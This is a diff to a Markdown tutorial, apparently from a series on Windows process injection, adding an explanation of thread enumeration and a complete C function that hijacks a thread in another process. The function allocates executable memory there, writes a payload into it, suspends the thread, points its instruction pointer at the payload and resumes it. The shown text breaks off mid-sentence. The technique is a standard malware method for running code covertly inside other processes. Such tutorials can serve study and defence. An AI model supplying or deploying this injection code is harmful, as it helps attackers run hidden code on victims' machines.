@@ -37,6 +37,40 @@ DWORD find_threadid(DWORD pid) {
     return 0;
 }
 ```
-It is _very_ similar to the `find_pid()` function we have been using so far. This time, we find the thread id associated with each Process and return the Thread ID. 
+It is _very_ similar to the `find_pid()` function we have been using so far. Just like with `find_pid()`, we use the `CreateToolhelp32Snapshot()` to create a system snapshot with the `TH32CS_SNAPTHREAD` parameter to include all threads in the system in the snapshot. 
 
-We use the `CreateToolhelp32Snapshot()` to create a system snapshot with the `TH32CS_SNAPTHREAD` parameter to includes all threads in the system in the snapshot. (See: [this MSDN post](https://learn.microsoft.com/en-us/windows/win32/toolhelp/traversing-the-thread-list))
+We then use `Thread32First()` to retrieve information about the first thread of any process encountered in a system snapshot. Then, we iterate over the entries in the snapshot with `Thread32Next()` and check the `th32OwnerProcessID` value of the `THREADENTRY32` structs to see if it belongs to the target process. If it does, we try to open a handle to the thread with `OpenThread()`, and if a valid handle is acquired, we close all open Handles and return the Thread ID. (See: [this MSDN post](https://learn.microsoft.com/en-us/windows/win32/toolhelp/traversing-the-thread-list))
+
+Coming back to the `thread_context_injection()` function, it has the following code:
+```c
+int inject_thread_context(DWORD pid) {
+    CONTEXT ctx;
+    DWORD dResult;
+    BOOL bResult;
+    DWORD bWritten = 0;
+    DWORD thId = find_threadid(pid);
+    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thId);
+    HANDLE hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
+
+    LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+    bResult = WriteProcessMemory(hProcess, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) &bWritten);
+
+    dResult = SuspendThread(hThread);
+    ctx.ContextFlags = CONTEXT_FULL;
+    bResult = GetThreadContext(hThread, &ctx);
+    #ifdef _M_IX86 
+        ctx.Eip = (DWORD_PTR) pRemoteCode;
+    #else
+        ctx.Rip = (DWORD_PTR) pRemoteCode;
+    #endif
+    bResult = SetThreadContext(hThread, &ctx);
+    dResult = ResumeThread(hThread);
+
+    int _result = WaitForSingleObject(hThread, -1);
+    CloseHandle(hProcess);
+    CloseHandle(hThread);
+    return 0;
+}
+```
+
+The function 
